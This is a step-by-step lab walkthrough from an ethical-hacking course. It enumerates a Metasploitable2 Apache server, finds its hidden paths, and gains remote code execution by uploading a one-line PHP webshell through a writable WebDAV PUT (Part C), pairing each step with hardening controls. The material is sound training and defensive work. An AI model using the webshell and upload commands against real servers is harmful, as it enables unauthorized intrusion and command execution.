# Module 13 — Hacking Web Servers · Guided Lab Walkthrough

> Step-by-step against **your own lab** ([`../../labs/`](../../labs/)) — never a server you don't own. Target the **Metasploitable2** Apache host (`192.168.56.20`, real WebDAV/phpMyAdmin/TWiki) from **Kali** (`192.168.56.10`); the DVWA Docker host (`localhost:8081`) is a fallback. Each step: command, what you should see, a hint, and the defender/PAM takeaway. Outputs are **representative**.

**Goal:** footprint a web server, discover its hidden tree, then turn a **WebDAV `PUT`** misconfiguration into a foothold — and see why every step maps to a hardening control, not a code fix.

---

## Part A — Enumerate & banner-grab (the footprint)

### A1. Service & version detection
```bash
nmap -sV -p80,443 192.168.56.20
```
**You should see** the HTTP service and its banner, e.g.:
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) DAV/2)
```
**Observe:** the `DAV/2` token already hints WebDAV is compiled in — note it. The `2.2.8` version is your **patch-management** starting point (look the version up; do **not** guess CVE numbers).

<details><summary>Hint</summary>No banner? Add `-sV --version-intensity 9`. If port 80 is filtered, confirm the VM is up with `nmap -sn 192.168.56.0/24` and that Kali is on the host-only net.</details>

**Defender/PAM view:** the version banner is free intel for an attacker. Suppression is obscurity — the real control is a **patch cadence + accurate inventory** ([`../../defender-pam/`](../../defender-pam/)).

### A2. Raw response headers (banner grab)
```bash
curl -sI http://192.168.56.20
```
**You should see:**
```
HTTP/1.1 200 OK
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
```
**Observe:** `Server:` and `X-Powered-By:` confirm the stack and reveal an ancient PHP — more patch surface.

### A3. Fingerprint the stack
```bash
whatweb http://192.168.56.20
```
**You should see** a summary line naming Apache, the PHP version, and any detected apps (phpMyAdmin, TWiki).

### A4. Which HTTP methods are enabled?
```bash
curl -s -X OPTIONS -i http://192.168.56.20/dav/
nmap -p80 --script http-methods,http-webdav-scan 192.168.56.20
```
**You should see** an `Allow:` header listing methods — crucially **`PUT`, `DELETE`, `MOVE`** on `/dav/`, and `http-webdav-scan` reporting WebDAV enabled:
```
Allow: OPTIONS, GET, HEAD, POST, PUT, DELETE, COPY, MOVE, PROPFIND, ...
```
**Observe:** `PUT`/`MOVE` writable on a directory = the WebDAV upload path. (`TRACE` present would flag **XST**.)

<details><summary>Hint</summary>If `/dav/` 404s, run `nmap -p80 --script http-enum 192.168.56.20` first to locate the DAV directory; on Metasploitable2 it is usually `/dav/`.</details>

**Defender/PAM view:** disable WebDAV and unused methods (`PUT`/`DELETE`/`TRACE`) in the build baseline; keep the doc root **read-only**.

---

## Part B — Content discovery (map the hidden tree)

### B1. Known-issue & misconfig scan
```bash
nikto -h http://192.168.56.20
```
**You should see** flags for default files, directory indexing, dangerous methods, and missing security headers, e.g.:
```
+ Server: Apache/2.2.8 (Ubuntu) DAV/2
+ OSVDB-xxxx: /dav/ : WebDAV enabled (PUT method allowed)
+ /phpMyAdmin/ : phpMyAdmin directory found
+ OSVDB-3268: /doc/ : Directory indexing found
```
**Observe:** Nikto is **loud** — every hit is a *misconfiguration or default*, exactly the sysadmin-hardening surface.

### B2. Directory / file brute forcing
```bash
gobuster dir -u http://192.168.56.20 \
  -w /usr/share/wordlists/dirb/common.txt -x php,bak,old
# or:
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt \
     -u http://192.168.56.20/FUZZ -mc 200,301,302,403
```
**You should see** discovered paths with status codes:
```
/dav                  (Status: 301)
/phpMyAdmin           (Status: 301)
/twiki                (Status: 301)
/index.php            (Status: 200)
```
**Observe:** content discovery *guesses existing* paths (admin panels, backups) — this is **directory brute forcing**, not traversal. The `-x php,bak,old` extensions hunt **source-disclosure** files like `config.php.bak`.

<details><summary>Hint</summary>Wordlist path differs per distro. If `dirb` lists are missing, install seclists (`apt install seclists`) and point `-w` at `/usr/share/seclists/Discovery/Web-Content/common.txt`.</details>

**Defender/PAM view:** remove sample/default apps (phpMyAdmin, docs) on deploy, disable directory indexing, and keep **no secrets/backups in the web root**.

---

## Part C — Exploit the WebDAV misconfiguration (the foothold)

WebDAV with a writable `PUT` lets you drop an executable script into the doc root — a classic web-**server** finding (config, not code).

### C1. Confirm which extensions are writable & executable
```bash
davtest -url http://192.168.56.20/dav/
```
**You should see** a per-extension matrix; the key lines:
```
PUT     File: http://192.168.56.20/dav/davtest_xxxx.php   SUCCEED
EXEC    File: http://192.168.56.20/dav/davtest_xxxx.php   SUCCEED
```
**Observe:** `PUT ... SUCCEED` **and** `EXEC ... SUCCEED` for `.php` means an uploaded PHP file both writes **and runs** — that is code execution.

### C2. Upload a minimal test webshell
```bash
# a 1-line PHP command runner, written locally then PUT to the DAV dir
echo '<?php system($_GET["c"]); ?>' > shell.php
curl -T shell.php http://192.168.56.20/dav/shell.php
```
**You should see** an HTTP `201 Created` (or `204`) from the `PUT`.

<details><summary>Hint</summary>`curl -T` performs the `PUT`. If you get `403/405`, `PUT` is disabled or the dir isn't writable — re-check A4/C1. `cadaver http://192.168.56.20/dav/` then `put shell.php` is the interactive alternative.</details>

### C3. Execute a command through the foothold
```bash
curl -s "http://192.168.56.20/dav/shell.php?c=id"
```
**You should see** the web service account, **not** root:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
**Observe:** you have RCE, but only as **`www-data`** — the least-privilege boundary in action. To go further you'd still need a privilege-escalation step (Module 06). Compare: if this daemon ran as **root**, the same webshell would own the box outright.

**Defender/PAM view:** three controls would have stopped or contained this — **disable WebDAV/`PUT`** (prevention), **read-only doc root + FIM** (a new `shell.php` trips an alert), and a **least-privilege service account** so the foothold inherits almost nothing. Onboard that account to **CPM** and have the app fetch DB/API secrets via **CCP at runtime**, so a webshell finds no reusable static credential in config — see [`../../defender-pam/cyberark-attack-mapping.md`](../../defender-pam/cyberark-attack-mapping.md).

---

## What you should conclude
| Step | Real-world defense |
|---|---|
| Version banner exposed (A1–A2) | Patch cadence + inventory (suppression is only obscurity) |
| `PUT`/`MOVE` enabled on `/dav/` (A4) | Disable WebDAV & unused HTTP methods |
| phpMyAdmin / docs / indexing (B1) | Remove samples on deploy; disable directory listing |
| `.bak`/`.old` hunted (B2) | No secrets/backups in the web root |
| Webshell PUT succeeded (C2) | Read-only doc root + file-integrity monitoring |
| RCE runs as `www-data`, not root (C3) | Least-privilege service account; CCP/CPM for its secrets |

**The through-line:** nearly every finding was a **configuration or patch** gap, not a code bug — which is exactly why this module maps onto standard hardening and change control.

## Cleanup
```bash
# remove the uploaded test shell from the DAV directory
curl -X DELETE http://192.168.56.20/dav/shell.php
rm -f shell.php            # local copy on Kali
# if DELETE is blocked, remove /var/www/dav/shell.php from the VM console
```

## Record it
Log the banner, enabled methods, discovered paths, and the `id` output in the **My lab log** table in [README.md](README.md); note misses in [PROGRESS.md](../../PROGRESS.md).
